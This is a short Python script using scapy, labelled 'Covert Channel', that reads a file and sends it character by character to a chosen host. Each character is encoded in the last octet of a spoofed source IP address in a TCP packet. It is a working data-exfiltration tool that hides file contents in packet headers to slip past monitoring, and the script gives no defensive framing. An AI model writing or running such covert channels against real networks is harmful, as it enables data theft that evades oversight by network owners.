import argparse

from scapy.all import *
from scapy.layers.inet import IP, TCP

# Argparse setup
parser = argparse.ArgumentParser(description="Covert Channel")
parser.add_argument('-d', '--dest', dest='dest', help='Destination IP', required=True)
parser.add_argument('-p', '--port', dest='port', help='Destination Port', required=True)
parser.add_argument('-s', '--subnet', dest='subnet', help='First 3 octects of source subnet ', required=True)
parser.add_argument('-f', '--file', dest='filename', help='File to send', required=True)
args = parser.parse_args()


def main():
    # Open the file to be sent
    print 'Sending File:' + args.filename
    with open(args.filename, "r") as payloadFile:
        payload = payloadFile.read().rstrip('\n')


        # Iterate through payload and create/send one packet per char
        for byt in payload:
            print(byt)
            uniCode = ord(byt)  # returns unicode int
            pack = IP(dst=args.dest, src=args.subnet + "." + `uniCode`)/TCP(sport=8081, dport=int(args.port), window=4096)
            send(pack)

if __name__ == '__main__':
    main()